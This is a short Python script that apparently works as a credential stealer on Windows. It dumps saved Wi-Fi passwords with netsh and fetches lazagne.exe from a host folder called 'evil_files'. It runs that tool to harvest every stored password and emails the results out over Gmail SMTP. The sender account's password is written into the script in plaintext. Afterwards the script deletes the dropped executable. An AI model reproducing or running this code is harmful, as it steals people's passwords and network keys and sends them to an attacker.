import subprocess, smtplib, re, os, tempfile, requests

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.168.0.104/evil_files/lazagne.exe")
result1 = subprocess.check_output("lazagne.exe all", shell=True)



print("[+] Report is being sent to mail successfully...!!! ")
send_mail("2020projects2020@gmail.com", "SohanMohitMridul!!", result)
send_mail("2020projects2020@gmail.com", "SohanMohitMridul!!", result1)
os.remove("lazagne.exe")
